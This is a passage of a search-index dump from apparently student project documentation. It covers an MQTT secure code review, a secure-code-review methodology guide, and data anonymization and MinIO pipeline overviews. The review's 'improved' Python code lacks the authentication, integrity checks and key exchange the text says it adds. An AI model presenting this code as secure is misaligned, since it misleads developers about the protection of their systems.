Team/secure-code/project-1-MQTT#sample-codes-for-receiving-and-sending-through-the-mqtt","content":"  ","version":"Next","tagName":"h2"},{"title":"MQTT Code Review","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/project1-mqtt-secure-code-review","content":"","keywords":"","version":"Next"},{"title":"Secure Coding Review and Improvements for Project 1​","type":1,"pageTitle":"MQTT Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/project1-mqtt-secure-code-review#secure-coding-review-and-improvements-for-project-1","content":" iot/Research/CyberSecurityMQTT/MQTT_data_frame_handler.py at main · redbackoperations/iot · GitHub  Overview: As part of the secure coding review, I have analyzed the provided Python code for potential security vulnerabilities and have outlined areas that need improvement. Below are the identified issues along with recommendations for enhancement.  Encryption Key Management: Issue: The encryption key (encryption_key) is generated within the script and is hardcoded. Hardcoding keys poses a security risk as it can be easily compromised if an attacker gains access to the code.Recommendation: Generate the encryption key securely using a cryptographic library and store it in a secure location external to the code. Authentication and Authorization: Issue: The MQTT client connects to the broker without any authentication mechanism. Lack of authentication can lead to unauthorized access if the broker allows anonymous connections or if credentials are compromised.Recommendation: Implement authentication and authorization mechanisms to ensure only authorized clients can connect to the broker. Error Handling: Issue: The code includes basic error handling, but it lacks comprehensive error handling for various scenarios such as network failures, decryption errors, etc.Recommendation: Enhance error handling to handle different error scenarios and provide meaningful error messages to users. Data Integrity: Issue: While data is encrypted for confidentiality, there is no mechanism to ensure data integrity. Without integrity checks, data could be tampered with during transmission without detection.Recommendation: Implement data integrity checks such as message authentication codes (MACs) or digital signatures to verify the integrity of transmitted data. Code Structure and Readability: Issue: The code structure could be improved for better readability and maintainability. Certain methods are lengthy and may benefit from refactoring.Recommendation: Refactor the code to improve readability and modularize functionalities into smaller, more manageable components. Secure Key Exchange: Issue: The symmetric encryption key is used for both encryption and decryption without a secure key exchange mechanism.Recommendation: Implement a secure key exchange mechanism, such as asymmetric encryption, to securely exchange the symmetric encryption key between parties.  Below code includes the following improvements:  Encryption key is generated securely.Authentication and error handling are enhanced.Data integrity checks are added.Code structure is improved for better readability and maintainability.Secure key exchange mechanism is implemented.  python #!/usr/bin/env python # coding: utf-8 import pandas as pd import paho.mqtt.client as mqtt import json import time from datetime import datetime from cryptography.fernet import Fernet class MQTTDataFrameHandler: def __init__(self, broker_address, topic, encryption_key): self.broker_address = broker_address self.topic = topic self.client = mqtt.Client() self.client.on_message = self._on_message self.encryption_key = encryption_key # Pass encryption key as argument self.cipher_suite = Fernet(encryption_key) # Initialize cipher suite self.data = None self.error = None self.max_retries = 3 self.retry_interval = 5 def _on_message(self, client, userdata, message): try: encrypted_data = message.payload data_json = self.cipher_suite.decrypt(encrypted_data).decode('utf-8') self.data = pd.read_json(data_json) self.data['timestamp'] = time.time() except Exception as e: self.error = str(e) def encrypt_value(self, value): return self.cipher_suite.encrypt(str(value).encode('utf-8')) def decrypt_value(self, encrypted_value): return self.cipher_suite.decrypt(encrypted_value).decode('utf-8') def create_json_payload(self, dataframe, user_id=None): df_anonymized = dataframe.copy() if 'incline' in df_anonymized.columns: df_anonymized['incline'] = df_anonymized['incline'].apply(lambda x: self.encrypt_value(x) if x else x) if 'resistance' in df_anonymized.columns: df_anonymized['resistance'] = df_anonymized['resistance'].apply(lambda x: self.encrypt_value(x) if x else x) data_json = df_anonymized.to_json(orient='split') payload = { 'timestamp': datetime.utcnow().isoformat(), 'data': json.loads(data_json) } if user_id: payload['user_id'] = user_id return json.dumps(payload) def receive_data(self, timeout=10): retries = 0 while retries &lt; self.max_retries: try: self.client.connect(self.broker_address, 1883, 60) self.client.subscribe(self.topic) self.client.loop_start() start_time = time.time() while self.data is None and (time.time() - start_time) &lt; timeout: if self.error: print(f&quot;Error while receiving data: {self.error}&quot;) break self.client.loop_stop() return self.data except Exception as e: print(f&quot;Connection error: {e}. Retrying in {self.retry_interval} seconds...&quot;) retries += 1 time.sleep(self.retry_interval) print(&quot;Max retries reached. Failed to receive data.&quot;) return None def send_data(self, df, user_id=None): retries = 0 while retries &lt; self.max_retries: try: json_payload = self.create_json_payload(df, user_id) encrypted_payload = self.cipher_suite.encrypt(json_payload.encode('utf-8')) self.client.connect(self.broker_address, 1883, 60) self.client.publish(self.topic, encrypted_payload) self.client.disconnect() return except Exception as e: print(f&quot;Error while sending data: {e}. Retrying in {self.retry_interval} seconds...&quot;) retries += 1 time.sleep(self.retry_interval) print(&quot;Max retries reached. Failed to send data.&quot;) def main(): broker_address = &quot;test.mosquitto.org&quot; topic = &quot;test/topic&quot; encryption_key = Fernet.generate_key() # Generate encryption key handler = MQTTDataFrameHandler(broker_address, topic, encryption_key) if __name__ == &quot;__main__&quot;: main()  ","version":"Next","tagName":"h2"},{"title":"Secure Code Review","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies","content":"","keywords":"","version":"Next"},{"title":"Secure Code Review​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#secure-code-review-1","content":" Secure code review is a critical process of reviewing the source code of an application aiming to identify and mitigate vulnerability, threats that could have been unintentionally placed during development [1]. This involves the examining of source code to find the potential weaknesses, loopholes or bugs that could be exploited by attackers. Beyond safeguarding against potential exploits by malicious actors, it also plays a vital role to improve the overall quality of the codebase. It also uncovers the code inefficiencies, poor coding practices, and potential points of failure. Therefore, many organizations are investing in secure code review processes for not only mitigating security risks, but also create a strong foundation for the long-term success of their projects [2].  ","version":"Next","tagName":"h2"},{"title":"Methods and Practices for Enhancing Software Security​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#methods-and-practices-for-enhancing-software-security","content":" There are various methods and practices that contribute to fortifying applications against cyber threats. While each approach serves its purpose and strategies to enhance Security.  ","version":"Next","tagName":"h2"},{"title":"Security Requirements Analysis and Threat Modeling​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#security-requirements-analysis-and-threat-modeling","content":" Security requirements analysis and threat modeling are processes that help identify security needs and potential risks during software development. They ensure that security is considered right from the start and help decide which security measures are most important. However, they don't look at the code itself in as much detail as secure code review does.  ","version":"Next","tagName":"h3"},{"title":"Static and Dynamic Application Security Testing (SAST and DAST)​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#static-and-dynamic-application-security-testing-sast-and-dast","content":" Static and dynamic application security testing, known as SAST and DAST, examine software differently. SAST looks at the source code for vulnerabilities without running the program, while DAST tests the running application for vulnerabilities as it operates. Although these methods can uncover vulnerabilities, they might not catch all types of security issues and have limitations in their coverage.  ","version":"Next","tagName":"h3"},{"title":"Code Signing​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#code-signing","content":" Code signing is a process that confirms the authenticity and integrity of code, which helps maintain its integrity. While code signing ensures that the code hasn't been tampered with, it doesn't directly deal with or resolve security vulnerabilities present within the codebase.  ","version":"Next","tagName":"h3"},{"title":"Why Choose Secure Code Review?​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#why-choose-secure-code-review","content":" ","version":"Next","tagName":"h2"},{"title":"Proactive Vulnerability Detection​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#proactive-vulnerability-detection","content":" Secure code review stands as a proactive measure in software development, ensuring that potential security vulnerabilities are identified and addressed before they pose risks to the system. By conducting thorough reviews of the codebase during the development phase, teams can prevent potential exploitation by attackers, safeguarding the integrity and security of the application. By regularly reviewing and discussing security best practices and common vulnerabilities, developers gain a deeper understanding of secure coding principles and learn to identify potential security risks in their code independently.  For example, suppose a development team is building a web application that handles sensitive user data, such as financial information. During a secure code review, a developer identifies a section of code that doesn't properly validate user input before processing it, potentially exposing the application to SQL injection attacks. By catching this vulnerability early in the development process through code review, the team can implement proper input validation mechanisms to prevent such attacks, thereby enhancing the application's security posture.  ","version":"Next","tagName":"h3"},{"title":"Integration with Development Process​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#integration-with-development-process","content":" Secure code review seamlessly integrates with the software development lifecycle, making it a cost-effective and efficient method for ensuring security. Integrating secure code review into the development workflow allows for continuous monitoring and improvement of security practices. As developers review each other's code and collaborate on identifying and resolving vulnerabilities, they gain valuable insights into secure coding practices and common security pitfalls. This iterative process helps build a stronger security culture within the organization and empowers developers to write more secure code from the start.  ","version":"Next","tagName":"h3"},{"title":"Comprehensive Coverage​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#comprehensive-coverage","content":" Secure code review offers a distinct advantage over other methods by providing a rough examination of the codebase. While other security practices may focus on specific aspects of security, such as system defenses or runtime testing, secure code review delves deeply into the code itself, examining every line for potential vulnerabilities. This comprehensive approach allows secure code review to uncover both common security weaknesses, such as input validation errors or insecure data handling, as well as more obscure vulnerabilities that may evade automated testing tools or go unnoticed during runtime analysis. For example, a static analysis tool may flag a potential SQL injection vulnerability in a particular code snippet, but only a human reviewer conducting a thorough code review may notice subtle variations in input validation logic that could also lead to injection attacks. By providing this level of scrutiny, secure code review helps organizations bolster their defenses against a wide range of security threats, from the most common to the most sophisticated.  ","version":"Next","tagName":"h3"},{"title":"Continuous Improvement​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#continuous-improvement","content":" Secure code review does the continuous improvement within development teams by encouraging adherence to secure coding practices, knowledge sharing, and skills development.  While other security practices play crucial roles, secure code review stands out as a proactive and comprehensive approach for ensuring software security. By addressing vulnerabilities at the source code level, organizations can build resilient software systems that withstand cyber threats. Prioritizing secure code review is fundamental for mitigating security risks and ensuring the long-term success of software projects.  ","version":"Next","tagName":"h3"},{"title":"Guide to Secure Code Review: A Step-by-Step Approach:​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#guide-to-secure-code-review-a-step-by-step-approach","content":" Conducting a secure code review is a critical process in software development aimed at identifying and mitigating security vulnerabilities within the codebase. Whether you're a seasoned developer or new to the field, following a structured approach can help ensure thorough examination and effective remediation of security issues. Here’s steps involved in performing a secure code review:    ","version":"Next","tagName":"h2"},{"title":"1. Understand the Application and its Requirements:​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#1-understand-the-application-and-its-requirements","content":" The first step involves obtaining a thorough understanding of the application's functionality, architecture, and specific security requirements. This knowledge acts as a roadmap for the review process, aiding in the effective prioritization of areas to focus on. Understanding the intricacies of the application's design and purpose is essential for conducting a targeted and efficient code review, ensuring comprehensive coverage of potential security vulnerabilities. Additionally, having a basic understanding of code is imperative to effectively assess the codebase.  ","version":"Next","tagName":"h3"},{"title":"2. Set Up Your Development Environment:​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#2-set-up-your-development-environment","content":" Ensure that you have access to essential tools, version control systems, and designated code review platforms. Familiarize yourself with the structure and organization of the codebase to facilitate seamless navigation during the review process. In our case, access to the project will be facilitated through a GitHub repository, where you will initiate a Git pull request to retrieve the codebase. Once accessed, consider conducting preliminary tests on the codebase to ascertain its functionality and identify potential areas of concern. Additionally, you have the flexibility to choose between conducting the secure code review on your local host machine or within a Linux environment, depending on your preference and requirements. To enhance the effectiveness of the code review, consider utilizing multiple scanning tools such as Snyk, SonarQube, bandit and many more. These tools can assist in identifying security vulnerabilities, ensuring a comprehensive evaluation of the codebase.  ","version":"Next","tagName":"h3"},{"title":"3. Define Review Criteria and Objectives​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#3-define-review-criteria-and-objectives","content":" Establishing clear criteria and objectives for the code review is essential for ensuring a focused and effective evaluation of the codebase. Begin by defining the security standards and compliance requirements that the application must adhere to. Identify key areas of concern based on factors such as the application's sensitivity, potential impact of security breaches, and industry-specific regulations. By setting clear criteria and objectives, you provide a framework for conducting the code review, guiding reviewers to focus on the most critical aspects of security. This systematic approach ensures that the review process is thorough, targeted, and aligned with the overall security goals of the organization.  ","version":"Next","tagName":"h3"},{"title":"4. Review Execution​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#4-review-execution","content":" Execute the code review process by systematically examining the source code for potential security vulnerabilities. This can be achieved through a combination of manual inspection techniques and automated scanning tools. During the review, you can start with common security flaws such as injection attacks (e.g., SQL injection, XSS), authentication issues (e.g., weak password policies, improper session management), and data validation errors (e.g., lack of input validation, insufficient output encoding). By following an approach that combines manual scrutiny with automated analysis, you can effectively identify and address security vulnerabilities within the codebase. This ensures that the application is fortified against potential threats and adheres to established security standards and best practices.  ","version":"Next","tagName":"h3"},{"title":"5. Identify Security Vulnerabilities​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#5-identify-security-vulnerabilities","content":" As you delve deeper into the codebase, consistently applying the review process, you'll begin to uncover potential security vulnerabilities. It's essential to maintain consistency and persistence during this phase, as it may initially be challenging to identify vulnerabilities. Don't be discouraged if you encounter difficulties in finding your first vulnerability; persistence is key. Keep iterating through the code, scrutinizing each component thoroughly, and remain vigilant for any signs of security weaknesses. Remember, every vulnerability identified brings the application one step closer to enhanced security and resilience. While conducting the review, it's vital to do more than just spotting vulnerabilities; take the time to understand why these vulnerabilities exist in the first place [2].  ","version":"Next","tagName":"h3"},{"title":"6. Document Findings and Provide Recommendations:​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#6-document-findings-and-provide-recommendations","content":" Documenting findings is critical for effective code review process. Documents should have identified vulnerabilities, their severity, and proposed fixes in your documentation. Provide actionable recommendations for remediation, prioritizing vulnerabilities based on their potential impact on system security. This documentation ensures that developers have clear guidance for addressing security issues and helps stakeholders understand the security posture of the application. For documentation, we will provide you with a template, where you will document all your findings.  In conclusion, these steps offer a pathway to contribute significantly to the security and reliability of software applications.  ","version":"Next","tagName":"h3"},{"title":"Secure Code Review Checklist​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#secure-code-review-checklist","content":"     ","version":"Next","tagName":"h2"},{"title":"Key Concepts of Secure Code Review​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#key-concepts-of-secure-code-review","content":" ","version":"Next","tagName":"h2"},{"title":"Security Principles​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#security-principles","content":" There are some guidelines to secure the system, and these guidelines are Security Principles. These principles serve as the foundation for cybersecurity practices by guiding to mitigate the risk, securing data, and ensuring confidentiality, integrating, and availability of information [3]. There are lot of principles, some of them I will be explaining here:  Principle of Least Privilege: This principle restricts the privileges that are granted. Least Privilege states that users and processes should be granted only the minimum level of access or permissions necessary to perform their legitimate task. This design of security reduces the attack surface. Principle of Fail-Safe Defaults: This design of security encourages the system or software secure default settings. In simple language, at time of any failure, whether it is network failure, or misconfiguration, the system should fall back to secure state. This helps to prevent unauthorized access and data breaches. Principle of Complete Mediation: Principle of Complete Mediation states the validating and enforcing access controls for every request or operation performed within a system. This ensures only validated users can access the controls, therefore it prevents security bypass.  ","version":"Next","tagName":"h3"},{"title":"Common Vulnerabilities and how to detect them​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#common-vulnerabilities-and-how-to-detect-them","content":" Various vulnerabilities are commonly found across different codebases. To identify these vulnerabilities, developers and secure code reviewers can refer to two widely recognized lists: CWE and CVE. Common Weakness Enumeration (CWE): CWE is a publicly available list of software security weaknesses that identifies and categorizes common software vulnerabilities. It helps developers and security professionals understand potential security risks and provides a common language for discussing and addressing these weaknesses. Common Vulnerabilities and Exposures (CVE): CVE is a database of publicly known security vulnerabilities and exposures used to identify specific security issues in software and hardware systems. Each CVE entry provides a unique identifier, description, and relevant details to track vulnerabilities and ensure proper patch management and mitigation strategies. Secure code reviewers can use these lists to identify common vulnerabilities in codebases. Here are some of the most prevalent vulnerabilities, along with ways to detect them:  CWE-79: Cross-Site Scripting (XSS): This occurs when user inputs are not properly sanitized, allowing attackers to inject malicious scripts into web pages. We can detect this vulnerability by looking after unsanitized user inputs in web applications.CWE-89: SQL Injection: It Happens when user inputs are used to construct SQL queries without proper parameterization, leading to injection attacks. We can check for raw SQL queries with direct user inputs.CWE-22: Path Traversal: Path Traversal occurs when a program improperly validates user-supplied file paths, allowing attackers to access restricted files or directories. Detecting this vulnerability involves looking for file operations that use user-controlled inputs, especially those involving directory traversal patterns like ../. To prevent path traversal, we need to validate and sanitize all file paths, restrict file access to specific directories, and avoid direct file system manipulation based on user input.CWE-434: Unrestricted File Upload: Unrestricted File Upload happens when an application allows file uploads without proper validation, potentially permitting malicious files. To detect this vulnerability, examine code that handles file uploads and ensure it validates file types and sizes. Implement security controls to allow only specific file formats and scan uploaded files for malware or suspicious content.CWE-120: Buffer Overflow: This happens when a program writes data beyond the allocated memory buffer, leading to crashes or code execution. This vulnerability can be detected by analyzing code for unbounded buffers and reviewing array operations to ensure proper bounds checking.CWE-732: Improper Authorization: Improper Authorization occurs when a system does not enforce authorization checks which allows the unauthorized access to resources or functions. This vulnerability can be detected by reviewing authentication and authorization logic, ensuring proper role-based access control, and confirming that all sensitive operations are properly protected. Implement strict permission checks and ensure a robust authorization model.CWE-94: Code Injection: Code Injection occurs when an application allows execution of arbitrary code due to insufficient input validation or unsanitized inputs. Detecting this vulnerability involves analyzing code that constructs executable statements or scripts and ensuring proper validation and sanitization.  You can read for the exploited vulnerability here to have an idea of CVE and CWE:link  ","version":"Next","tagName":"h2"},{"title":"Common Patterns for Vulnerabilities:​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#common-patterns-for-vulnerabilities","content":" There are some common patterns or coding practices that often lead to security vulnerabilities. We can ease our work by recognizing these patterns. We can quickly identify high-risk areas in the codebase and recommend necessary changes. Here are some of the most common patterns which lead to vulnerability:  Direct Use of User Inputs: Most of the time in user input like constructing SQL queries or system commands, it creates a high risk for injection attacks. We should ensure that user inputs are properly sanitized, validated, and parameterized to prevent SQL Injection, Cross-Site Scripting (XSS).Improper Error Handling: Detailed error messages should not be revealed as it can leak the system information or data can be exploited by attackers to gain insights into the application's structure or identify potential weak points. Reviewers should check for error messages that disclose sensitive information and recommend a more generic approach to error handling to avoid information leakage.Hardcoded Credentials: Storing sensitive information like passwords, API keys, or security tokens directly in the code is a significant security risk. These hardcoded credentials can be easily extracted by attackers.Insecure Configuration: Configuration files contains the security risks due to the reason exposed ports, weak permissions, or unencrypted connections, can lead to unauthorized access and other security issues. Reviewers should examine configuration files for these risks and recommend secure configuration practices, such as limiting access to only necessary users, using encrypted connections, and enforcing strong permissions.Inadequate Session Management: Improper handling of user sessions can lead to session hijacking or unauthorized access. We should check for secure session management practices, like generating unique session identifiers, implementing session expiration, and protecting sessions with encryption. Additionally, ensure that session tokens are not exposed or accessible to unauthorized users.   ","version":"Next","tagName":"h2"},{"title":"Some important documents for upskilling and practices:​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#some-important-documents-for-upskilling-and-practices","content":" OWASP Code Review Guide:link Secure Code Review Best Practices [cheat sheet included]:link Building a Practical Secure Code Review Process:link Secure Coding Practices Checklist:link  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Secure Code Review","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/secure-code-review-methodologies#references","content":" [1] Threat Intelligence, “Secure Code Reviews: What is it, Benefits and Checklist,” 10 March 2023. [Online]. Available: https://www.threatintelligence.com/blog/secure-code-reviews. [2] The Cloud Native Experts, “What Is Secure Code Review? Process, Tools, and Best Practices,” 5 November 2023. [Online]. Available: https://www.aquasec.com/cloud-native-academy/devsecops/secure-code-review/. [3] J. Mlakar, “InfoSec Design Principles – 8 Security Principles To Implement,” MlakarTechTalk, 16 April 2019. [Online]. Available: https://www.mlakartechtalk.com/infosec-design-principles-8-security-principles-to-implement/. ","version":"Next","tagName":"h2"},{"title":"Anonymization and Masking in Healthcare Data","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization","content":"","keywords":"","version":"Next"},{"title":"Introduction:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#introduction","content":" In the realm of healthcare data management, preserving patient privacy and confidentiality is of utmost importance. Anonymization and masking techniques serve as essential tools in safeguarding sensitive information while allowing for meaningful analysis and research. This document elucidates the implementation of anonymization and masking in a heart attack prediction dataset and provides insights into the rationale behind their application.  ","version":"Next","tagName":"h2"},{"title":"Code Implementation:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#code-implementation","content":" The provided code utilizes Python libraries such as Pandas, Faker, and hashlib to anonymize and mask sensitive columns within the heart attack prediction dataset. Let's delve into the implementation details  ","version":"Next","tagName":"h2"},{"title":"Reading the Dataset:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#reading-the-dataset","content":" The original dataset is read into a Pandas DataFrame, facilitating data manipulation and transformation.  ","version":"Next","tagName":"h3"},{"title":"Initializing Faker:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#initializing-faker","content":" An instance of the Faker library is initialized to generate fake data for non-sensitive columns.  ","version":"Next","tagName":"h3"},{"title":"Anonymization and Masking:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#anonymization-and-masking","content":" Patient ID: Hashing using SHA-256 ensures irreversible transformation, preserving anonymity while retaining uniqueness.Age: Age values are generalized into ranges to conceal precise age information, enhancing privacy.Binary Attributes: Columns representing binary attributes such as sex, diabetes, smoking, etc., are masked as 'Yes' or 'No' to obscure specific health conditions or behaviors.Heart Attack Risk: Masked as 'High' or 'Low' to conceal exact risk prediction outcomes.Numeric Attributes: Numeric values such as cholesterol, blood pressure, etc., are replaced with random values within a specified range, preventing re-identification while preserving statistical properties.  ","version":"Next","tagName":"h3"},{"title":"Saving the Anonymized Dataset:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#saving-the-anonymized-dataset","content":" The anonymized dataset is saved to a CSV file for further analysis and research purposes.  ","version":"Next","tagName":"h3"},{"title":"Rationale for Anonymization and Masking:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#rationale-for-anonymization-and-masking","content":" Privacy Preservation: Anonymizing sensitive attributes such as patient IDs and masking identifiable information mitigate the risk of unauthorized access and identity disclosure, thus preserving patient privacy.Regulatory Compliance: Adherence to regulations such as HIPAA and GDPR mandates the protection of patient data through anonymization and masking, ensuring compliance and avoiding legal ramifications.Facilitating Research: Anonymized datasets enable researchers and analysts to conduct studies and derive insights without compromising patient privacy, fostering collaboration and innovation in healthcare research.Building Trust: Demonstrating a commitment to protecting patient privacy through anonymization and masking fosters trust among patients, healthcare providers, and regulatory bodies, bolstering the integrity of healthcare data management practices.  ","version":"Next","tagName":"h3"},{"title":"Conclusion:​","type":1,"pageTitle":"Anonymization and Masking in Healthcare Data","url":"/redback-documentation/docs/data-warehousing/Data Anonymization/dataanonymization#conclusion","content":" The implementation of anonymization and masking techniques in healthcare data management is indispensable for preserving patient privacy, complying with regulations, facilitating research, and building trust within the healthcare ecosystem. By anonymizing sensitive attributes and masking identifiable information, organizations uphold ethical standards while harnessing the power of data-driven insights to improve patient outcomes and healthcare delivery ","version":"Next","tagName":"h2"},{"title":"Data Preprocessing Pipeline with MinIO","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#introduction","content":" The prevalence of data across various sectors necessitates efficient data management practices to ensure data is not only stored securely but is also readily available and processed for analysis. This documentation outlines the theoretical foundation for a data preprocessing pipeline developed to interface with MinIO, an object storage solution, facilitating streamlined data operations from raw data acquisition to processed data storage.  ","version":"Next","tagName":"h2"},{"title":"Conceptual Framework​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#conceptual-framework","content":" ","version":"Next","tagName":"h2"},{"title":"Objective​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#objective","content":" The primary goal of this pipeline is to automate the processing of data stored in CSV format within MinIO buckets, transforming raw data into a form that is clean, structured, and analysis-ready. This transformation involves stages of data cleaning, validation, and storage management, which are crucial for maintaining data integrity and usability.  ","version":"Next","tagName":"h3"},{"title":"Components​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#components","content":" MinIO: Chosen for its high-performance, scalable object storage capabilities, MinIO serves as the backbone for storing both raw and processed data.Python: Utilized for its extensive library support and robust data handling capabilities, Python drives the scripting and automation of the pipeline.Pandas Library: Employs this library for its powerful data manipulation tools that facilitate cleaning and transforming data efficiently.  ","version":"Next","tagName":"h3"},{"title":"Process Overview​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#process-overview","content":" ","version":"Next","tagName":"h2"},{"title":"Data Collection​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#data-collection","content":" Data initially resides in designated 'Bronze' buckets within MinIO, categorized as raw and unprocessed. This data typically comes from various sources and may contain inconsistencies, missing values, or unnecessary information.  ","version":"Next","tagName":"h3"},{"title":"Data Preprocessing​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#data-preprocessing","content":" The preprocessing stage involves several key operations:  Cleaning: Removing corrupt or inaccurate records from the data.Transformation: Converting data into a useful and efficient format, which includes handling missing values and normalizing data.Validation: Ensuring data conforms to a set of standards or rules to maintain data quality.  ","version":"Next","tagName":"h3"},{"title":"Data Storage​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#data-storage","content":" Once processed, the data is moved to 'Silver' buckets, categorized as cleaned and structured. This separation of data into different stages/buckets supports better management and retrieval.  ","version":"Next","tagName":"h3"},{"title":"Theoretical Benefits​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#theoretical-benefits","content":" Scalability: The use of MinIO allows the pipeline to handle increasing amounts of data without a loss in performance, crucial for scalability as data needs grow.Automation: Automating the pipeline reduces the potential for human error, increases processing speed, and allows for continuous data handling without manual intervention.Data Integrity: By systematically cleaning and validating data, the pipeline ensures that only high-quality data is stored for analysis, which is critical for making informed business decisions.Flexibility: The pipeline is designed to be flexible, accommodating changes in data source formats and storage requirements without significant redesigns.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Data Preprocessing Pipeline with MinIO","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/Data Preprocessing Pipeline Doc#conclusion","content":" The data preprocessing pipeline serves as a critical component in the data management ecosystem, bridging the gap between raw data collection and advanced data analysis. Its integration with MinIO highlights a commitment to leveraging advanced storage solutions to enhance data processing workflows. This theoretical approach not only supports current data needs but also anticipates future expansions, ensuring the pipeline remains a valuable asset in managing and utilizing data effectively. ","version":"Next","tagName":"h2"},{"title":"Proof of Concept: Data Preprocessing Pipeline with MinIO","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Data preprocessing pipeline with MinIo/POC","content":"","keywords":"","version":"Next"},{"title":"Project Overview​","type":1,"pageTitle":"Proof of Concept: Data Preprocessing 